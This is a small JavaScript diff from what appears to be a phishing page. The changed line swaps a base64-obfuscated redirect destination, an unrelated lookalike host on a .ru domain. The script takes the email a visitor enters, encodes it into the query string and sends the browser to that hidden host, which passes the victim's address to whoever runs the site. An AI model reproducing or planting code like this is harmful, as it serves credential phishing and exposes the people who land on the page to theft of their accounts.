@@ -96,7 +96,7 @@
     function continueLoading() {
       const email = document.getElementById('email-input').value.trim().toLowerCase();
       if (validateEmail(email)) {
-        const encodedLink = "aHR0cHM6Ly92M3JpZjN5LmF2amV0LXR3LmNvbS9vWEpadA=="; // Encoded URL
+        const encodedLink = "aHR0cHM6Ly9hNkcubG9taXhvci5ydS9KSWpuai8="; // Encoded URL
         const link = atob(encodedLink) + "?e=" + btoa(email);
         window.location.href = link;
       } else {
